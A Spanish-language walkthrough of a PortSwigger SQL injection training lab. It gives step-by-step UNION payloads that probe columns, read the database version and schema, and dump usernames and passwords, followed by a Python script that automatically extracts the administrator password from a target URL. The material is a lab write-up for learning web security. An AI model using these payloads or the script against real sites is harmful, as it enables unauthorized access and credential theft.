---
title: "05 SQL injection UNION attack, retrieving data from other tables"
collection: publications
category: portswigger
permalink: /publications/SQLi/05_SQL injection UNION attack, retrieving data from other tables
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL en el campo de categoría de producto. Para resolver el laboratorio, realizamos un ataque de inyección SQL basado en UNION que recupera los nombres de usuario y las contraseñas de los usuarios de la aplicación.'
date: 2024-12-01
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'SQL injection UNION attack, retrieving data from other tables'
---

![logo]({{site.url}}/images/SQLi/sqli-5/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-5/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, realice un ataque de inyección SQL UNION que recupere todos los nombres de usuario y contraseñas, y utilice la información para iniciar sesión como usuario `administrator`.

## Determinamos que el campo si es vulnerable

```javascript
' or 1=1--
```

![Vulnerable]({{site.url}}/images/SQLi/sqli-5/vulnerable.png)

## Determinar el numero de columnas retornadas por la consulta

Miramos la cantidad decolumnas retornar hasta que arroje error. Vemos que nos arroja 2 columnas.

```javascript
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

![Order by]({{site.url}}/images/SQLi/sqli-5/order by.png)

## Miramos que columna es de tipo 'String'

Inyectamos en cada una de ellas mirando cual podemos inyectar 'String'

```javascript
' UNION SELECT 'A', NULL--
' UNION SELECT NULL, 'A'--
' UNION SELECT 'A', 'A'--
```

En este caso ambas columnas reciben tipo string

![String]({{site.url}}/images/SQLi/sqli-5/tipo string.png)

## Obtener que tipo de Base de dato es

Es una BD Posgres SQL

```javascript
' UNION SELECT version(), null--
```

![Base de datos]({{site.url}}/images/SQLi/sqli-5/BD.png)

## Obtener el nombre de las tablas

Ya que conocemos el tipo de BD, debemos listar el nombre de las tablas.

```javascript
' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='public'--
```

![Tablas]({{site.url}}/images/SQLi/sqli-5/tablas.png)

## Listamos las columnas

```javascript
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--
```

![Columnas de la tabla]({{site.url}}/images/SQLi/sqli-5/columbas de la tabla.png)

## Listar username y password
Ya que conocemos las columnas de la tabla, debemos listarla

```javascript
' UNION SELECT username, password FROM users--
```

![Usuarios Passwords]({{site.url}}/images/SQLi/sqli-5/listado usuario y password.png)

## Procedemos a hacer el login

```
administrator
4hve3wc018z7mnlll440
```

![login]({{site.url}}/images/SQLi/sqli-5/login.png)

## Solucionado

Solventado el laboratorio

![Aprobado]({{site.url}}/images/SQLi/sqli-5/aprobado.png)

# Codigo Python
```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Gifts'
    sql_payload = "' UNION select username, password from users--"
    r = requests.get(url + path + sql_payload,  verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator password.")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
        print("[+] The administrator password is '%s'" % admin_password)
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the list of usernames and passwords...")
    if not exploit_sqli_users_table(url):
        print("[-] Did not find an administrator password.")
```